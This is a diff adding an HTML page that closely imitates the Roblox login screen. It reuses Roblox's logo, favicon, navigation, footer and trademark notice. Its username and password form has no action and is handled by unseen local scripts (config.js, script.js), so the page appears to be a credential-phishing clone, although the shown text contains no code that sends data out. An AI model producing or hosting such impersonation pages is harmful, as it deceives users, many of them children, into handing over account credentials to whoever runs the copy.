@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link rel="icon" href="https://images.rbxcdn.com/7bba321f4d8328683d6e59487ce514eb">
+</head>
+<body>
+    <div class="navbar">
+        <div class="navbar-left">
+            <div class="logo"><img src="https://images.rbxcdn.com/c69b74f49e785df33b732273fad9dbe0.svg" alt="Roblox"></div>
+            <div class="nav-links">
+                <a href="#">Charts</a>
+                <a href="#">Marketplace</a>
+                <a href="#">Create</a>
+                <a href="#">Robux</a>
+            </div>
+        </div>
+        <div class="navbar-right">
+            <div class="search-box">
+                <i class="fas fa-search"></i>
+                <input type="text" placeholder="Search">
+            </div>
+            <button class="signup-btn">Sign Up</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="login-container">
+            <h1>Login to Roblox</h1>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" name="username" placeholder="Username/Email/Phone" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                
+                <button type="submit" class="login-btn">Log In</button>
+                
+                <div class="forgot-password">
+                    <a href="#">Forgot Password or Username?</a>
+                </div>
+                
+                <button type="button" class="alt-login-btn">Email Me a One-Time Code</button>
+                <button type="button" class="alt-login-btn">Use Another Device</button>
+                
+                <div class="signup-prompt">
+                    <p>Don't have an account? <a href="#">Sign Up</a></p>
+                </div>
+            </form>
+            
+            <div id="loginStatus" class="login-status"></div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">About Us</a>
+            <a href="#">Jobs</a>
+            <a href="#">Blog</a>
+            <a href="#">Parents</a>
+            <a href="#">Gift Cards</a>
+            <a href="#">Help</a>
+            <a href="#">Terms</a>
+            <a href="#">Accessibility</a>
+            <a href="#">Privacy</a>
+            <a href="#">Your Privacy Choices</a>
+        </div>
+        <div class="copyright">
+            ©2023 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
+        </div>
+    </div>
+    
+    <!-- Configuration file must be loaded before the main script -->
+    <script src="config.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
